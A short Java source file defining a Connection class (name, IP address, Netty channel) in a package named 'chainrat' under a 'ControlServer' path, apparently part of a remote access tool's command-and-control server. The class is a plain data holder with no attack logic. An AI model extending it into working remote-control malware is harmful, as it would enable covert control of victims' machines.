package com.nefi.chainrat.server.network.ControlServer;

import io.netty.channel.Channel;

public class Connection {

    public String name;
    public String IP;
    public Channel channel;

    public Connection(String name, String IP, Channel channel){
        this.name = name;
        this.IP = IP;
        this.channel = channel;
    }
}
